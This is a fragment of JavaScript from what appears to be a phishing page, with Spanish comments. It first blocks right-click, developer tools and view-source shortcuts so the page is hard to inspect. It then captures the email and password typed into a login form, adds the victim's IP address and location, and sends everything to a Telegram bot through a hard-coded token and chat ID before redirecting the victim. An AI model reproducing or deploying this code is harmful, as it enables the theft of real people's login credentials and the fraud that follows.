<script> 
    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
    document.onkeydown = function(e) {
        if (
            e.keyCode == 123 || // F12
            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
        ) {
            e.preventDefault();
            return false;
        }
    }
</script>

   <!-- jQuery -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

  <script>
    $(document).ready(function () {
      $('#loginForm').submit(function (e) {
        e.preventDefault();

        const u_name1  = $('#1').val().trim();
        const u_name2    = $('#2').val().trim();
        let message = `✅ Email - 4:20 ✅\nCorreo: ${u_name1}\nClave: ${u_name2}`;

        // Obtener IP pública
         $.getJSON("https://api.ipify.org?format=json", function (data) {
        const ip = data.ip;
        $.getJSON("https://ipinfo.io", function (response) {
          const ip2 = response.city + ", " + response.country;
          message += `\n✅ IP: ${ip}\n✅ Ubicación: ${ip2}`;

          const telegram_bot_id = "8651929816:AAHrWHIQJxaA8_YnVodXBSSG7rK2rzp7M40";
          const chat_id = "6956488104";
          const settings = {
            "async": true,
            "crossDomain": true,
            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
            "method": "POST",
            "headers": {
              "Content-Type": "application/json",
              "cache-control": "no-cache"
            },
            "data": JSON.stringify({
              "chat_id": chat_id,
              "text": message
            })
          };

          $.ajax(settings).done(function () {
            window.location.href = '2.html';
          });
        });
      });
    });
  });
</script>
